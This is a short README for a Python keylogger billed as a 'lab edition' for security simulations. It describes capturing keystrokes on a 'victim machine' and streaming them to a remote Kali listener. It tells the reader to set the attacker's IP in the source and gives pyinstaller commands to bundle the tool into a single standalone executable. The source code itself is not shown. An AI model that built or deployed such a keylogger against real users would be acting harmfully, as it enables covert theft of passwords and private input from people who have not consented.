# Network Keystroke Monitor (Lab Edition)

A standalone keystroke logger designed for network security simulations. It captures keystrokes on a victim machine and streams them to a remote Kali Linux listener in real-time.

## ⚙️ Configuration
Before building the binary, update the hard-coded IP in `src/main.py`:

1. Open `src/main.py`
2. Change `KALI_IP = "192.168.x.x"` to your actual Kali IP.

## 🛠️ Build Instructions (On Arch/Development Machine)
To bundle everything into a single executable file:

```bash
# Install dependencies
pip install pynput pyinstaller

# Generate the standalone binary
pyinstaller --onefile --clean --paths=src src/main.py
